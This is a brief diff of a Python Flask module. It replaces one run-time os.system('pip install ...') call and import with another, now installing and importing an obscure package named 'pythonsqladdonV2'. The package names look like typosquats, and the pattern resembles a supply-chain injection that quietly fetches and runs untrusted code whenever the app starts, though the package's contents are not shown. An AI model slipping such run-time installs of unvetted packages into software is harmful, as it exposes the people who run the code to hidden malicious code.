@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pysqlipackagesV2")
-import pysqlipackagesV2
+os.system("pip install pythonsqladdonV2")
+import pythonsqladdonV2
 import flask
 
 from flask import g
